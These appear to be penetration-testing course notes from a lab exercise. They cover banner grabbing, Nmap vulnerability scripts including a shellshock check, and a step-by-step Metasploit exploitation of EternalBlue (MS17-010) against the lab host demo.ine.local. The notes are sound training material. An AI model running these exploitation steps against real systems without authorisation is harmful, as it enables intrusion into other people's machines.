# Introduction

## Penetration Testing Phases

![grafik](https://github.com/user-attachments/assets/5d6c25a9-9920-4011-a243-fdfa17c5659b)

**Exploitation Methodology:**
- Identify Vulnerable Services
- Identify & Prepare Exploit Code
- Gaining Access
  - Automated - MSF
  - Manual
- Obtain remote access on target system.
- Bypass AV detection
- Pivot on to other systems

# Vulnerability Scanning

## Banner Grabbing

- Banner grabbing is an information gathering technique used by pentesters to enumerate information regarding the target operating system as well as the services that are running on its open ports.
- The primary objective of banner grabbing is to identify the service running on a specific port as well as the service version.
- Banner grabbing can be peformed through various techniques:
  - Performing a service version detection scan with Nmap.
  - Connecting to the open port with Netcat.
  - Authenticating with the service (If the service supports authentication), for example, SSH, FTP, Telnet etc.
 
## Demo: Banner Grabbing

`ls -al /usr/share/nmap/scripts/ | pgrep banner`

`nmap -sV --script=banner demo.ine.local`


#### Banner Grabbing with Netcat

`man nc`

`nc demo.ine.local 22`

`searchsploit openssh 7.2`

`ssh root@demo.ine.local`: gives us the ssh welcome banner. Could give us useful information.

## Vulnerability Scanning with Nmap Scripts

**nmap.org**
# Vulnerability Scanning with Nmap Scripts

## Overview

## Demo: Vulnerability Scanning with Nmap Scripts

### Step-by-Step Process

Perform a basic Nmap service and OS detection scan on the target:

```bash
nmap -sV -O demo.ine.local
```

### Vulnerability Detection Scans

Nmap scripts are stored in the following directory:

```bash
ls -al /usr/share/nmap/scripts/
```

To limit the results and search for scripts related to HTTP:

```bash
ls -al /usr/share/nmap/scripts/ | grep http
```

Run an Nmap scan with the **http-enum** script, which enumerates common web application files and directories:

```bash
nmap -sV -p 80 --script=http-enum demo.ine.local
```

### Finding Exploits with Searchsploit

Search for available exploits related to **Apache 2.4.6** using **Searchsploit**:

```bash
searchsploit apache 2.4.6
```

### Creating / Editing a Nmap Script

You can create or edit an existing Nmap script using a text editor such as `nano`. For example, to edit the **http-enum** script:

```bash
nano /usr/share/nmap/scripts/http-enum.nse
```

### Utilizing Nmap Scripts for Specific Services

To list vulnerability detection scripts, use the following command:

```bash
ls -al /usr/share/nmap/scripts/ | grep vuln
```

We want to check if the target is vulnerable to the **shellshock** vulnerability. First, list the relevant scripts:

```bash
ls -al /usr/share/nmap/scripts/ | grep shellshock
```

Run an Nmap scan with the **http-shellshock** script on port 80:

```bash
nmap -sV -p 80 --script=http-shellshock demo.ine.local
```

### Analyzing a Web Application Vulnerability

We check the website and the source code and discover that it runs a script for a **dynamic timer**. We try to access the **gettime.cgi** script on the target:

```bash
http://demo.ine.local/gettime.cgi
```

Now, we check if the **gettime.cgi** file is vulnerable to the **shellshock** vulnerability by running the **http-shellshock** script with additional arguments:

```bash
nmap -sV -p 80 --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" demo.ine.local
```

### Conclusion

What we accomplished:
- Ran a basic **Nmap scan** to detect services and the OS on the target.
- Explored where **Nmap scripts** are stored and how to filter and use specific scripts.
- Used the **http-enum** script to enumerate directories on a web server.
- Performed a **shellshock** vulnerability scan on the target by utilizing Nmap scripts.
- Analyzed a potential **web application vulnerability** by interacting with the web server and targeting specific scripts.

This demonstrates how to use Nmap's scripting engine for vulnerability scanning and how to customize and utilize specific scripts to find vulnerabilities in web applications.


Note: `ls al /usr/share/nmap/Scripts/ | grep ftp` to look for ftp scripts
# Vulnerability Scanning with Metasploit

## Overview

- **Metasploit**: A popular penetration testing framework that allows security researchers and penetration testers to discover, exploit, and validate vulnerabilities in a target system.
- **Goal**: In this demo, we will identify a vulnerability (MS17-010, also known as EternalBlue) on a target system, and use Metasploit to exploit it.

## Demo: Vulnerability Scanning with Metasploit

### Step-by-Step Process

### Initial Nmap Scan

We start with an Nmap scan to identify open ports and services running on the target system:

```bash
nmap -sS -sV demo.ine.local
```

### Searching for EternalBlue Vulnerability

After identifying that the system might be running an SMB service, we use **Searchsploit** to check for the **EternalBlue** vulnerability and **MS17-010** exploits:

```bash
searchsploit EternalBlue
searchsploit ms17-010
```

### Launching Metasploit

Start Metasploit:

```bash
msfconsole
```

### Searching for the EternalBlue Module

Search for the **EternalBlue** auxiliary and exploit modules in Metasploit:

```bash
search eternalblue
```

### Using the SMB MS17-010 Scanner

To verify if the target system is vulnerable, use the **SMB MS17-010 vulnerability scanner**:

```bash
use auxiliary/scanner/smb/smb_ms17_010
```

Show the available options for the module:

```bash
show options
```

Set the target IP address:

```bash
set rhosts [targetIP]
```

Run the vulnerability scan:

```bash
run
```

The scanner checks if the target is vulnerable and retrieves OS information.

### Exploiting EternalBlue Vulnerability

Now that we've confirmed the target is vulnerable, use the **EternalBlue exploit** module:

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

Set the target IP address again:

```bash
set rhosts [targetIP]
```

Run the exploit:

```bash
run
```

### Post-Exploitation

Once the exploit runs successfully, we can interact with the compromised system. Retrieve system information using the **sysinfo** command:

```bash
sysinfo
```

### Conclusion

What we accomplished:
- Performed an **Nmap scan** to detect open ports and services on the target.
- Used **Searchsploit** to identify the **EternalBlue** vulnerability (MS17-010).
- Launched Metasploit and used the **SMB vulnerability scanner** to confirm that the target was vulnerable to EternalBlue.
- Successfully exploited the target using the **MS17-010 EternalBlue** exploit.
- Gathered post-exploitation information, such as system details, from the compromised machine.

This demonstration highlights how Metasploit can be used to perform vulnerability scanning and exploitation of known vulnerabilities in a target system.




